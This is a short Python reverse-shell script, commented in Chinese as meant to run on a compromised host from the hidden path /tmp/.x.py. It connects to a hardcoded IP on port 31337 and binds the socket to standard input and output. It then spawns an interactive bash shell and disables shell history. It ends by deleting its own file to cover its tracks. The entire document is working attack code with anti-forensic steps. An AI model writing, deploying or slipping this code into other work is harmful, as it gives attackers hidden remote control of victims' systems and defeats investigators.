#!/usr/bin/env python
# -*- coding:utf8 -*-

""""
运行于被控端，用于反弹系统shell，默认保存于/tmp/.x.py

"""

import os
import pty
import socket

lhost = "100.90.29.12"
lport = 31337


def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    os.putenv("HISTSIZE", "0")
    pty.spawn("/bin/bash")
    s.close()
    os.remove('/tmp/.x.py')  # 销毁自身


if __name__ == "__main__":
    main()
